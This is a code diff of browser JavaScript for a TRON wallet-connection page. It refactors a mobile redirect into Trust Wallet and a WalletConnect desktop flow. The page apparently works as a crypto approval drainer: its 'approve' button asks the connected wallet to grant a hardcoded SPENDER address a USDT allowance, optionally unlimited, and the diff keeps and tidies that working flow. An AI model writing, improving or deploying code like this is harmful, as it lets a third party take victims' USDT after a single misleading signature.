@@ -57,7 +57,6 @@ import bs58 from "https://esm.sh/bs58";
 
 const PROJECT_ID = "171db6da15a54effc1b4a06f889a3c3f";
 const TRON_CHAIN = "tron:0x2b6653dc";
-const TRONGRID = "https://api.trongrid.io";
 
 const USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const SPENDER = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";
@@ -65,7 +64,7 @@ const SPENDER = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";
 let client, session, wallet;
 let unlimited = false;
 
-// helpers
+// ---------- HELPERS ----------
 function log(msg){
   document.getElementById("logs").innerText += msg + "\n";
 }
@@ -74,61 +73,40 @@ function isMobile(){
   return /Android|iPhone|iPad/i.test(navigator.userAgent);
 }
 
-// redirect to wallet (mobile)
-function openWallet(){
-  window.location.href =
-    "https://link.trustwallet.com/open_url?url=" +
-    encodeURIComponent(window.location.href);
-}
-
-// tron hex
-function tronToHex(addr){
-  const bytes = bs58.decode(addr);
-  return Array.from(bytes).map(b=>b.toString(16).padStart(2,"0")).join("").slice(0,42);
-}
-
-// encode approve
-function encodeApprove(spenderHex, amount){
-  const clean = spenderHex.replace(/^41/,"").padStart(64,"0");
-
-  let amountHex;
-
-  if(unlimited){
-    amountHex = "f".repeat(64);
-  } else {
-    const val = BigInt(Math.floor(amount * 1e6));
-    amountHex = val.toString(16).padStart(64,"0");
-  }
-
-  return "095ea7b3" + clean + amountHex;
-}
-
-// UI sync
+// ---------- UI ----------
 const range = document.getElementById("range");
 const input = document.getElementById("amount");
 
 range.oninput = ()=> input.value = range.value;
 input.oninput = ()=> range.value = input.value;
 
-// unlimited toggle
 document.getElementById("unlimitedBtn").onclick = ()=>{
   unlimited = !unlimited;
   document.getElementById("unlimitedBtn").innerText =
     "Unlimited: " + (unlimited ? "ON" : "OFF");
 };
 
-// 🔥 MOBILE CONNECT (tronWeb)
-async function mobileConnect(){
-  if(window.tronWeb && window.tronWeb.defaultAddress.base58){
-    wallet = window.tronWeb.defaultAddress.base58;
-    document.getElementById("wallet").innerText = wallet;
-    document.getElementById("status").innerText = "Connected (Mobile)";
-    return true;
-  }
-  return false;
+// ---------- MOBILE CONNECT ----------
+function waitForTronWeb(){
+  return new Promise((resolve)=>{
+    let tries = 0;
+
+    const timer = setInterval(()=>{
+      if(window.tronWeb && window.tronWeb.defaultAddress.base58){
+        clearInterval(timer);
+        resolve(window.tronWeb.defaultAddress.base58);
+      }
+
+      tries++;
+      if(tries > 30){
+        clearInterval(timer);
+        resolve(null);
+      }
+    },500);
+  });
 }
 
-// 🔥 DESKTOP CONNECT (your WalletConnect flow)
+// ---------- DESKTOP CONNECT ----------
 async function desktopConnect(){
   const { SignClient } = await import("https://esm.sh/@walletconnect/sign-client@2.17.0");
 
@@ -145,14 +123,14 @@ async function desktopConnect(){
   const { uri, approval } = await client.connect({
     requiredNamespaces:{
       tron:{
-        methods:["tron_signTransaction"], // keep your flow
+        methods:["tron_signTransaction"], // keep your working flow
         chains:[TRON_CHAIN],
         events:[]
       }
     }
   });
 
-  new QRCode(document.getElementById("qr"), {
+  new QRCode(document.getElementById("qr"),{
     text: uri,
     width:200,
     height:200
@@ -166,16 +144,18 @@ async function desktopConnect(){
   document.getElementById("status").innerText = "Connected (Desktop)";
 }
 
-// approve
+// ---------- APPROVE ----------
 document.getElementById("approveBtn").onclick = async ()=>{
   try{
     const amount = Number(input.value);
+
     const value = unlimited
       ? "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
       : Math.floor(amount * 1e6);
 
-    // ✅ MOBILE (perfect flow)
+    // 🔥 MOBILE (PERFECT FLOW)
     if(window.tronWeb && wallet){
+
       const tx = await window.tronWeb.transactionBuilder.triggerSmartContract(
         USDT,
         "approve(address,uint256)",
@@ -195,8 +175,7 @@ document.getElementById("approveBtn").onclick = async ()=>{
       return;
     }
 
-    // ⚠️ Desktop fallback (limited)
-    throw "Desktop approve via WalletConnect not reliable";
+    throw "Desktop approve via WalletConnect is limited";
 
   }catch(e){
     log("ERROR:\n" + e);
@@ -204,17 +183,37 @@ document.getElementById("approveBtn").onclick = async ()=>{
   }
 };
 
-// 🚀 INIT
+// ---------- INIT ----------
 (async ()=>{
   document.getElementById("status").innerText = "Connecting...";
 
   if(isMobile()){
-    const ok = await mobileConnect();
+    const redirected = localStorage.getItem("wallet_redirected");
 
-    if(!ok){
-      openWallet(); // force open wallet
+    // redirect ONLY once
+    if(!redirected){
+      localStorage.setItem("wallet_redirected","true");
+
+      window.location.href =
+        "https://link.trustwallet.com/open_url?url=" +
+        encodeURIComponent(window.location.href);
+
       return;
     }
+
+    // already in wallet → wait for tronWeb
+    wallet = await waitForTronWeb();
+
+    if(wallet){
+      document.getElementById("wallet").innerText = wallet;
+      document.getElementById("status").innerText = "Connected (Mobile)";
+      log("Connected via tronWeb");
+
+      localStorage.removeItem("wallet_redirected");
+    } else {
+      document.getElementById("status").innerText = "Wallet not detected";
+    }
+
   } else {
     await desktopConnect();
   }
